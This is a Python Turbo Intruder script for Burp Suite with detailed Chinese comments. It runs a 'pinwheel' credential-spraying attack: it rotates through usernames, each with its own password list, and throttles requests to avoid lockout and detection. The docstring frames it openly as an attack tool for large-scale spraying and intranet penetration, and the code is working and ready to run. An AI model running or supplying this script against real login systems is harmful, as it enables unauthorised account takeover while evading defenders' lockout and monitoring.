"""
风车式凭据喷洒攻击脚本 - Turbo Intruder

功能说明：
这是一个专门设计的凭据喷洒攻击脚本，为每个用户名使用独立的密码字典。
采用"风车"式轮转策略，避免对单个账户进行连续攻击，降低被检测和锁定的风险。

作者：https://github.com/abiwaddell
详细说明：https://github.com/abiwaddell/Pinwheel

攻击策略：
1. 每个用户名对应独立的密码字典
2. 轮转式攻击，避免连续尝试同一账户
3. 节流控制，模拟正常登录行为
4. 学习模式建立响应基线

主要特性：
- 个性化字典：每个用户使用专门的密码列表
- 轮转攻击：循环尝试不同用户，避免锁定
- 智能节流：控制请求频率，规避检测
- 动态管理：自动清理已完成的字典

使用场景：
- 大规模凭据喷洒攻击
- 避免账户锁定的密码测试
- 个性化密码字典攻击
- 企业内网渗透测试
- 社会工程学密码测试

文件结构：
- users.txt: 用户名列表
- words1.txt: 第一个用户的密码字典
- words2.txt: 第二个用户的密码字典
- words3.txt: 第三个用户的密码字典
- ... 以此类推

技术特点：
- 动态文件加载
- 内存优化管理
- 轮转式调度算法
- 自动清理机制

参数配置：
- throttleMillisecs: 请求间隔（200毫秒）
- concurrentConnections: 并发连接数（5个）
- pipeline: 禁用HTTP管道
- engine: 使用Burp引擎

工作流程：
1. 加载用户名列表
2. 为每个用户加载对应的密码字典
3. 轮转式发送登录请求
4. 动态清理已完成的字典
5. 继续直到所有字典用完

防检测机制：
- 轮转攻击避免连续尝试
- 节流控制模拟正常行为
- 学习模式建立基线
- 只记录有趣的响应

注意事项：
- 确保文件命名正确
- 注意账户锁定策略
- 遵守测试授权
- 监控目标响应

使用方法：
1. 准备users.txt用户名文件
2. 为每个用户准备对应的密码字典
3. 调整节流参数
4. 运行脚本开始攻击

优化建议：
- 根据目标调整节流时间
- 使用高质量的密码字典
- 监控账户锁定情况
- 分析响应模式
"""

import time

# 配置参数
throttleMillisecs=200  # 请求间隔（毫秒）

def loadFile(filename):
    """
    加载文件内容到列表

    参数：
    - filename: 文件名

    返回：
    - 去除空白字符的行列表
    """
    with open(filename) as f:
        lines = f.readlines()
    return [x.strip() for x in lines]  # 去除每行的空白字符

def queueRequests(target, wordlists):
    # 创建凭据喷洒攻击引擎
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,        # 并发连接数
                           pipeline=False,                  # 禁用管道
                           engine=Engine.BURP               # 使用Burp引擎
                           )

    # 学习模式：建立正常响应基线
    for i in range(3,8):
        engine.queue(target.req, randstr(i), learn=1)      # 随机字符串学习
        engine.queue(target.req, target.baseInput, learn=2) # 基础输入学习

    # 加载用户名列表
    users=loadFile('users.txt')

    # 为每个用户加载对应的密码字典
    lists = []
    for i in range(1,len(users)+1):
        filename='words'+str(i)+'.txt'  # 密码字典文件名
        words=loadFile(filename)        # 加载密码列表
        lists.append(words)             # 添加到字典列表

    # 风车式轮转攻击
    while lists:  # 当还有字典未用完时继续
        i=0
        for list in lists:
            if list:  # 如果当前字典还有密码
                time.sleep(throttleMillisecs/1000)  # 节流延迟
                # 发送用户名和密码组合
                engine.queue(target.req, [users[i],list[0]])
                list.remove(list[0])  # 移除已使用的密码
            else:
                # 当前字典已用完，清理
                lists.remove(list)     # 移除空字典
                users.remove(users[i]) # 移除对应用户
            i+=1


def handleResponse(req, interesting):
    # 只记录有趣的响应（可能的成功登录）
    if interesting:
        table.add(req)

    # 可以添加更多分析逻辑：
    # - 检测成功登录的特征
    # - 识别账户锁定响应
    # - 分析响应时间模式
    # - 记录失败尝试次数